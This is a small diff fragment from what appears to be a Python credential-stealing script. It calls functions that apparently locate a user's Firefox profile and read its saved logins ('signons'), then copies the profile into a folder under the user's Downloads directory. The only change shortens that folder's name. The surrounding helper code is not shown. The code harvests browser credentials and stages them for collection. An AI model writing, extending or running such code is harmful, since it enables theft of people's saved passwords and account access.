@@ -39,5 +39,5 @@ firefox_profile = fire_profile(user)
 
 get_signons(user)
 
-copy(user, firefox_profile, os.path.join("C:/Users", user, "Downloads", "ROBMO"))
+copy(user, firefox_profile, os.path.join("C:/Users", user, "Downloads", "R"))
     
